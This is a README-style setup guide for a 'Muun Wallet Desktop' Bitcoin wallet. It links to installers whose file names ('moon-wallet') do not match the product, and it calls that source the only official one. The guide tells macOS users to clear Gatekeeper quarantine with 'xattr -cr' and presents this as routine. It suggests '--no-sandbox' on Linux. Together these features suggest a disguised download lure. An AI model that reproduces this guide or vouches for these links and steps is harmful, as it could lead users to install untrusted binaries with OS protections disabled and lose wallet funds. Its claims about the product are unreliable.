[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# Muun Wallet Getting Started Guide

Muun Wallet Desktop is a self-custodial Bitcoin and Lightning wallet for Windows, macOS, and Linux. This guide covers the complete first-time setup: downloading and installing the app, completing your Emergency Kit backup, and sending your first transaction. If you follow these steps in order, you will have a working, properly backed-up wallet ready for real use by the end.

---

## Step 1: Download the installer

Go to the [official v0.5.1 release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and download the file for your operating system:

- **macOS**: `moon-wallet-v0.5.1.dmg`
- **Windows**: `moon-wallet-v0.5.1.exe`
- **Linux**: `moon-wallet-v0.5.1.zip`

This is the only official source for Muun Wallet Desktop. Do not install from any other location. Before running the installer, verify the SHA-256 checksum against the values published on the release page — this confirms the file has not been modified in transit. The [download verification guide](how-to-verify-muun-wallet-download.md) explains exactly how to do this on each platform.

---

## Step 2: Install on your platform

**macOS**

Open the downloaded `.dmg` file and drag Muun Wallet into your Applications folder. If macOS shows a security warning on first launch because the app was downloaded from the internet, open Terminal and run:

```bash
xattr -cr /Applications/MuunWallet.app
```

Then launch normally from Applications. This is a standard macOS Gatekeeper step, not a sign of any problem with the installer. For a full walkthrough, see the [macOS install guide](how-to-install-muun-wallet-macos.md).

**Windows**

Double-click `moon-wallet-v0.5.1.exe` and follow the installer prompts. No administrator account or special permissions are needed beyond a normal application install. Once complete, launch Muun Wallet from the Start menu. See the [Windows install guide](how-to-install-muun-wallet-windows.md) for details.

**Linux**

Extract the `.zip` archive, mark the binary executable, and run it:

```bash
chmod +x muun-wallet
./muun-wallet
```

If your Linux environment uses an application sandbox, you may need to add `--no-sandbox` to the launch command. See the [Linux install guide](how-to-install-muun-wallet-linux.md) for distribution-specific notes.

---

## Step 3: Create your wallet

On first launch, Muun Wallet generates your wallet locally — your device key is created entirely on your machine. No account is created on a remote server at this point. Nothing you do during this step transmits your key material anywhere. Muun uses a 2-of-2 multisignature model: a key on your device and a separate key held by Muun's infrastructure are both required to authorize any spend. Neither key alone can move your funds.

The initial screen gives you two options: create a new wallet or restore an existing one from an Emergency Kit. If this is your first time, choose to create a new wallet.

---

## Step 4: Complete the Emergency Kit backup — do not skip this

**This is the single most important step in the entire setup process.** Muun Wallet does not use a standard 12- or 24-word seed phrase. Instead, it uses an Emergency Kit — a combination of a 32-character recovery code and a second factor you choose (a PDF export, a password, or an email-based recovery link). The Emergency Kit is what lets you recover your wallet on a completely new device, without your original hardware and without Muun's servers being online at the time.

During setup, Muun prompts you to create the Emergency Kit immediately. Complete this before you send or receive any real funds. Write down or print your recovery code and store it somewhere physically safe — separate from your computer. If you lose access to your device and have not completed the Emergency Kit, your funds will be unrecoverable.

For a detailed explanation of the backup system and why it differs from a seed phrase, see the [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md) and the [seed phrase vs Emergency Kit explainer](muun-wallet-seed-phrase-vs-emergency-kit.md).

---

## Step 5: Fund your wallet

Once the Emergency Kit is in place, you are ready to receive Bitcoin. Click Receive to see your on-chain Bitcoin address and your Lightning Address. You can share either depending on what the sender supports.

For your first test, receive a small amount — well below what would matter to you if something went unexpectedly wrong. Confirm that it appears in your balance before moving larger amounts.

---

## Step 6: Send your first transaction

Click Send and paste or scan the destination address or Lightning invoice. Before you confirm, Muun shows a live fee estimate based on current mempool conditions. This is the real fee — not an approximation shown after the fact. Review it carefully. If fees are elevated because of network congestion, you can choose to wait.

If you are sending a Lightning payment, the fee shown includes the on-chain swap component. Muun uses submarine swaps to settle Lightning payments against the Bitcoin base layer, which is what produces this fee. The [Lightning fees guide](muun-wallet-lightning-fees-explained.md) explains the mechanics in plain language.

Once you confirm, Muun broadcasts the transaction. If an on-chain transaction stalls due to a sudden fee spike, use the replace-by-fee (RBF) feature in the transaction detail view to bump the fee — see [how to fix a stuck transaction](muun-wallet-stuck-transaction-rbf.md).

---

## Common first-time questions

**I already use Muun on my phone. Can I access the same wallet on desktop?**

Yes. Desktop and mobile share the same underlying Emergency Kit system. You can restore your existing mobile wallet on the desktop app using your Emergency Kit credentials. Both will then reflect the same balance and history.

**Why does Muun not use a seed phrase like other wallets?**

The 2-of-2 multisig architecture does not map cleanly onto a standard BIP39 phrase. The Emergency Kit is designed specifically for this structure and ensures recovery is possible without Muun's servers. See [seed phrase vs Emergency Kit](muun-wallet-seed-phrase-vs-emergency-kit.md) for the full explanation.

**Is Muun Wallet safe?**

The custody model is genuinely non-custodial: your device key is always required to authorize a spend, and Muun's key alone can never move your funds. The [security guide](is-muun-wallet-safe.md) covers the full model, including what the 2-of-2 architecture protects against and where its trade-offs lie.

---

## Related articles

- [How to install Muun Wallet on macOS](how-to-install-muun-wallet-macos.md)
- [How to install Muun Wallet on Windows](how-to-install-muun-wallet-windows.md)
- [How to install Muun Wallet on Linux](how-to-install-muun-wallet-linux.md)
- [Muun Wallet Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
